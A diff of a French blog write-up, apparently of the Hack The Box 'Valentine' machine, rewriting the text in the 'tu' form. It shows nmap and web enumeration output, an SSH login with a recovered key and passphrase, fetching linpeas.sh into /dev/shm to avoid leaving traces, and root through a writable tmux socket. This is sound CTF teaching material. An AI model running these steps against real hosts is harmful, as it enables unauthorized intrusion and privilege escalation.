@@ -64,28 +64,28 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-Cette machine propose une progression simple mais instructive, centrée sur l'exploitation de la fameuse vulnérabilité **[Heartbleed (CVE-2014-0160)](https://fr.wikipedia.org/wiki/Heartbleed)**, découverte un jour de Saint-Valentin et mise en avant dès la phase d'énumération. 
+Cette machine propose une progression simple mais instructive, centrée sur l’exploitation de la fameuse vulnérabilité **[Heartbleed (CVE-2014-0160)](https://fr.wikipedia.org/wiki/Heartbleed)**, découverte un jour de Saint-Valentin et mise en avant dès la phase d’énumération.
 
-L'objectif est d'extraire des informations sensibles à partir du service TLS vulnérable, puis de convertir ces données en un accès utilisateur fonctionnel. La seconde partie s'oriente vers l'escalade de privilèges, où l'on découvre une configuration **tmux** mal sécurisée permettant d'obtenir un shell root de manière directe et efficace. 
+**Classée Easy, elle est idéale pour débuter sur Hack The Box et consolider les fondamentaux** : reconnaissance, exploitation, analyse de contenu et élévation de privilèges, avec une chaîne d’attaque courte et logique.
 
-L'ensemble constitue un exercice idéal pour réviser les fondamentaux : reconnaissance, exploitation, analyse de contenu et élévation de privilèges.
+L’objectif est d’extraire des informations sensibles à partir d’un service TLS vulnérable, puis de convertir ces données en un accès utilisateur fonctionnel. La seconde partie s’oriente vers l’escalade de privilèges, où tu découvres une configuration **tmux** mal sécurisée permettant d’obtenir un shell root de manière directe et efficace.
 
 ---
 
 ## Énumération
 
-Pour démarrer
+Pour démarrer :
 
-- entrons l'adresse IP de la cible `10.129.x.x   cible.htb`  dans /etc/hosts 
+- ajoute l’adresse IP de la cible dans `/etc/hosts` (ex. `10.129.x.x   valentine.htb`) : 
 
 ```bash
 sudo nano /etc/hosts
 ```
 
-- lançons mon script d'énumération {{< script "mon-nmap" >}} :
+- lance mon script d'énumération {{< script "mon-nmap" >}} :
 
 ```bash
-mon-nmap target.htb
+mon-nmap valentine.htb
 
 # Résultats dans le répertoire scans_nmap/
 #  - scans_nmap/full_tcp_scan.txt
@@ -97,7 +97,7 @@ mon-nmap target.htb
 
 ### Scan initial
 
-Le scan initial TCP complet (scans_nmap/full_tcp_scan.txt) révèle les ports ouverts suivants :
+Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) révèle les ports ouverts suivants :
 
 ```bash
 # Nmap 7.95 scan initiated Mon Nov 24 15:53:27 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt valentine.htb
@@ -117,14 +117,14 @@ PORT    STATE SERVICE
 
 Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.
 
-Voici le résultat (scans_nmap/aggresive_vuln_scan.txt) :
+Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
 
 ```bash
 [+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour valentine.htb
 [+] Commande utilisée :
     nmap -Pn -A -sV -p"22,80,443" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "valentine.htb"
 
-# Nmap 7.95 scan initiated Mon Nov 24 15:53:37 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80,443 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt valentine.htb
+# Nmap 7.95 scan initiated Mon Nov 24 15:53:37 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80,443 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan.txt valentine.htb
 Nmap scan report for valentine.htb (10.129.232.136)
 Host is up (0.0092s latency).
 
@@ -178,7 +178,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ### Scan ciblé CMS
 
-Le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
+Voici le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`) .
 
 ```bash
 # Nmap 7.95 scan initiated Mon Nov 24 15:53:53 2025 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80,443 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt valentine.htb
@@ -258,7 +258,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Scan UDP rapide
 
-Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
+Voici le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).
 
 ```bash
 # Nmap 7.95 scan initiated Mon Nov 24 15:54:21 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt valentine.htb
@@ -297,88 +297,63 @@ PORT      STATE         SERVICE
 ### Scan des répertoires
 Pour la partie découverte de chemins web, j'utilise mon script dédié {{< script "mon-recoweb" >}}
 
-```bash
+Voici le résultat repris dans le fichier `scans-recoweb/RESULTS_SUMMARY.txt`
 
-=== mon-recoweb valentine.htb START ===
-Script       : mon-recoweb
-Version      : mon-recoweb 2.1.6
-Date         : 2025-11-24 16:02:15
-Domaine      : valentine.htb
-IP           : 10.129.232.136
-Mode         : large
-Wordlist eff.: /tmp/mon-recoweb_valentine.htb_wl.ps2SlE
-Master       : /usr/share/wordlists/dirb/common.txt
-Codes        : 200,301,302,403  (strict=1)
-Extensions   : .php,.txt,
+```txt
+=== Résultat global (agrégé) ===
 
-DIR totaux bruts   : 32
-DIR totaux uniques : 16
-  - /cgi-bin
-  - /decode
-  - /decode.php
-  - /dev
-  - /encode
-  - /encode.php
-  - /.hta
-  - /.htaccess.php
-  - /.htaccess.txt
-  - /.hta.php
-  - /.hta.txt
-  - /.htpasswd.php
-  - /.htpasswd.txt
-  - /index
-  - /index.php
-  - /server-status
+/.
+/cgi-bin/
+/decode
+/dev/
+/encode
+/encode/
+/.ht
+/.htaccess
+/.htaccess.bak
+/.htc
+/.htgroup
+/.htm
+/.html
+/.htpasswd
+/.htpasswds
+/.htuser
+/index
+/index/
+/index.php
+/server-status
+/server-status/
 
---- Détails par port ---
-Port 80 (http)
-  whatweb :
-    http://valentine.htb:80/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.129.232.136], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
-  Baseline: code=404 size=290 words=32 (/worjc23h1irnd)
-  DIR (16)
-    - /cgi-bin/
-    - /decode
-    - /decode.php
-    - /dev
-    - /encode
-    - /encode.php
-    - /.hta
-    - /.htaccess.php
-    - /.htaccess.txt
-    - /.hta.php
-    - /.hta.txt
-    - /.htpasswd.php
-    - /.htpasswd.txt
-    - /index
-    - /index.php
-    - /server-status
+=== Détails par outil ===
 
-Port 443 (https)
-  whatweb :
-    https://valentine.htb:443/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.129.232.136], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
-  Baseline: code=404 size=291 words=32 (/ihq4snflblrnd)
-  DIR (16)
-    - /cgi-bin/
-    - /decode
-    - /decode.php
-    - /dev
-    - /encode
-    - /encode.php
-    - /.hta
-    - /.htaccess.php
-    - /.htaccess.txt
-    - /.hta.php
-    - /.hta.txt
-    - /.htpasswd.php
-    - /.htpasswd.txt
-    - /index
-    - /index.php
-    - /server-status
+[DIRB]
+/cgi-bin/
+/decode
+/dev/
+/encode
+/index
+/index.php
+/server-status
 
+[FFUF — DIRECTORIES]
+/dev/
+/encode/
+/index/
+/server-status/
 
-
-=== mon-recoweb valentine.htb END ===
-
+[FFUF — FILES]
+/.
+/.ht
+/.htaccess
+/.htaccess.bak
+/.htc
+/.htgroup
+/.htm
+/.html
+/.htpasswd
+/.htpasswds
+/.htuser
+/index.php
 
 ```
 
@@ -386,6 +361,48 @@ Port 443 (https)
 
 ### Scan des vhosts
 Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}}
+
+Voici les résultats repris dans le fichier `scans_subdomains/scan_vhosts.txt`
+
+```txt
+=== mon-subdomains valentine.htb START ===
+Script       : mon-subdomains
+Version      : mon-subdomains 2.0.0
+Date         : 2026-01-08 16:59:30
+Domaine      : valentine.htb
+IP           : 10.129.232.136
+Mode         : large
+Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
+Codes        : 200,301,302,401,403  (strict=1)
+
+VHOST totaux : 0
+  - (aucun)
+
+--- Détails par port ---
+Port 80 (http)
+  Baseline#1: code=200 size=38 words=2 (Host=roz5cppay9.valentine.htb)
+  Baseline#2: code=200 size=38 words=2 (Host=ayhkark7gp.valentine.htb)
+  Baseline#3: code=200 size=38 words=2 (Host=6r2lqcda9u.valentine.htb)
+  VHOST (0)
+    - (fuzzing sauté : wildcard probable)
+    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)
+
+Port 443 (https)
+  Baseline#1: code=200 size=38 words=2 (Host=4nnwzooemd.valentine.htb)
+  Baseline#2: code=200 size=38 words=2 (Host=toeoxtti22.valentine.htb)
+  Baseline#3: code=200 size=38 words=2 (Host=42bn9g7snc.valentine.htb)
+  VHOST (0)
+    - (fuzzing sauté : wildcard probable)
+    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)
+
+
+
+=== mon-subdomains valentine.htb END ===
+
+
+```
+
+
 
 ---
 
@@ -395,9 +412,9 @@ Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdoma
 
 Le site web exposé par la machine est extrêmement minimaliste : il ne présente qu'une unique page contenant simplement une image, *omg.jpg*, sans aucun lien ni fonctionnalité apparente. Face à une surface d'attaque aussi restreinte, il est logique d'envisager que cette image puisse dissimuler une information utile à la progression. 
 
-Nous commençons donc par la télécharger et l'analyser à l'aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Steganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
+Commence par la télécharger et l'analyser à l'aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Steganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
 
-Après avoir appliqué une série de ces techniques en commençant par **stegseek** , nous ne mettons en évidence aucun élément utile, ce qui confirme que **l'image ne constitue pas un vecteur d'exploitation** dans ce cas.
+Après avoir appliqué une série de ces techniques en commençant par `stegseek`, tu ne mets en évidence aucun élément utile, ce qui confirme que l’image ne constitue pas un vecteur d’exploitation dans ce cas.
 
 ![omg](omg.jpg)
 
@@ -569,7 +586,8 @@ To do:
 - création 'copier/coller' dans nano du fichier hype_key_decoded et dans mon cas, puisque je travaille dans un share windows, copie vers /home/kali/tmp
 
 ```bash
-cp .hype_key_decoded/home/kali/tmp
+mkdir -p /home/kali/tmp
+cp hype_key_decoded /home/kali/tmp/
 ```
 
 - modifications des permissions en 600 et connexion en tant que utilisateur `hype` (logique puis que la clé est hype_key, la clé de hype) avec la clé `hype_key_decoded` le mot de passe `heartbleedbelievethehype`
@@ -626,9 +644,9 @@ cd ~/utilitaires
 python3 -m http.server
 ```
 
-- dans valentine.htb, on va copier linpeas.sh dans /dev/shm car ce répertoire en mémoire vive est en écriture pour tous les utilisateurs et ne laisse aucune trace sur le disque.
+- Sur la cible, copie linpeas.sh dans /dev/shm car ce répertoire en mémoire vive est en écriture pour tous les utilisateurs et ne laisse aucune trace sur le disque.
 
-```
+```bash
 cd /dev/shm
 wget http://<adresse tun0>:8000/linpeas.sh
 chmod +x linpeas.sh
@@ -641,7 +659,7 @@ Dans linpeas les vulnérabilités sont classées et surlignées en couleur.
 
 ![linpeas-legend](linpeas-legend.png)
 
-Dans nos résultats de linpeas.sh nous trouvons cette ligne surlignée en rouge+jaune:
+Dans les résultats de linpeas.sh tu verras cette ligne surlignée en rouge+jaune:
 
 ![linpeas-tmux](linpeas-tmux.png)
 
@@ -669,16 +687,16 @@ Si on peut écrire sur ce socket, on peut :
 
 ### Vérifications 
 
-Dans le shell hype@valentine, on teste :
+Dans le shell hype@valentine, teste :
 
 ```bash
 ls -l /.devs/dev_sess
 srw-rw---- 1 root hype 0 Nov 26 00:30 /.devs/dev_sess
 ```
 
-ce qui montre que la session nous est accessible en écriture
+ce qui montre que que tu as l’accès en écriture au socket.
 
-Puis on s'attache avec :
+Puis tu t’attaches avec :
 
 ```bash
 tmux -S /.devs/dev_sess attach
@@ -690,7 +708,7 @@ Le résultat est un prompt root :
 root@valentine:~#
 ```
 
-**Nous sommes devenus root.**
+**Tu es devenu root.**
 
 ```bash
 root@Valentine:/# cat /root/root.txt
